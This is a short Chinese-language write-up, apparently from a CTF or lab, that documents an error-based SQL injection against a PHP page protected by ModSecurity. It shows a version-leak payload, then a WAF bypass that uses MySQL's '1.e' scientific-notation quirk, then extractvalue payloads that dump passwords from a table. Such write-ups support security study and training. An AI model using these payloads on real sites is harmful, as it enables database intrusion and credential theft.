![[Pasted image 20221204150847.png]]

---
首页长这样
![[Pasted image 20221204150928.png|700]]

有WAF
![[Pasted image 20221204151030.png|700]]
```php
/sql.php?id=1 and gtid_subset(version(),1);
```
通过报错注入能查询到version
![[Pasted image 20221204151225.png|700]]
利用`mysql 5.7`之前的科学计数的记号问题通过`1.e`实现`ModSecurity`的绕过
```php
/sql.php?id=1^1.e(extractvalue(1,concat(0x5c,(select(group_concat(password))from(info)))))
```
![[Pasted image 20221204172550.png]]
再输出后半段
```php
/sql.php?id=1^1.e(extractvalue(1,concat(0x5c,(select(group_concat(right(password,30)))from(info)))))
```
![[Pasted image 20221204172727.png|650]]

#Web #PHP #SQL注入 #modsecurity #报错注入 